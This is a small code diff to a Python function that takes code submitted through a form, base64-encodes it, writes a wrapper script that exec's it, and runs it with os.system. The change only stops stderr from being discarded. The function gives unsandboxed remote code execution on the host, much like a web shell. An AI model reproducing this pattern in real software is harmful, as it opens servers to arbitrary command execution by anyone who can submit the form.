@@ -16,7 +16,7 @@ def kontol():
       fname2 = f'{path}/{uuid.uuid4()}{time.time()}'
       with open(fname1, 'w') as f:
         f.write(f'exec(base64.b64decode(__import__("sys").argv[1].decode()))')
-      os.system(f'python{py_v} {fname1} {base64.b64encode(form["code"].encode()).decode()} 2> /dev/null > {fname2}')
+      os.system(f'python{py_v} {fname1} {base64.b64encode(form["code"].encode()).decode()} > {fname2}')
       try:
         with open(fname2, 'r') as f:
           result = f.read()
